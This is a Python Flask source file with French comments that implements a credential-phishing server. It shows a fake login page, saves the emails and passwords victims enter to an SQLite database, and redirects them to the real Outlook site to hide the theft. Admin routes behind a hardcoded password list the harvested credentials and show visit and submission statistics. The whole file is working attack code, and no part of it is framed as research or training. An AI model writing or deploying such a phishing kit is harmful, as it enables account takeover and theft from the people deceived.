from flask import Flask, render_template, request, redirect, Response
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)

# 🔹 Configuration de la base de données SQLite
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///phishing_data.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

# 🔹 Définition du modèle pour stocker les identifiants
class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(120), nullable=False)

# 🔹 Création des tables dans la base de données
with app.app_context():
    db.create_all()

# 🔹 Définition du mot de passe admin
ADMIN_PASSWORD = "Saouda2025!!"

# 🔹 Variables pour stocker les statistiques
total_visits = 0
total_submissions = 0

# 🔹 Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    global total_visits
    total_visits += 1  # Incrémenter le compteur de visites
    return render_template("login.html")

# 🔹 Route qui récupère les identifiants saisis et les stocke en base de données
@app.route("/submit", methods=["POST"])
def submit():
    global total_submissions
    total_submissions += 1  # Incrémenter le compteur de soumissions
    
    email = request.form["email"]
    password = request.form["password"]

    # Enregistrer dans la base de données
    new_credential = Credential(email=email, password=password)
    db.session.add(new_credential)
    db.session.commit()
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")
    
    # Rediriger vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# 🔹 Route protégée pour afficher les identifiants stockés
@app.route("/logs")
def logs():
    auth = request.authorization
    if not auth or auth.password != ADMIN_PASSWORD:
        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})

    credentials = Credential.query.all()
    data = "<h1>Identifiants enregistrés :</h1>"
    for cred in credentials:
        data += f"<p>Email: {cred.email} | Password: {cred.password}</p>"

    return data if credentials else "<h1>Aucun identifiant enregistré pour l'instant.</h1>"

# 🔹 Route protégée pour afficher les statistiques
@app.route("/stats")
def stats():
    auth = request.authorization
    if not auth or auth.password != ADMIN_PASSWORD:
        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
    
    return f"Nombre total de visites : {total_visits}<br>Nombre total de soumissions : {total_submissions}"

# 🔹 Lancer le serveur Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)
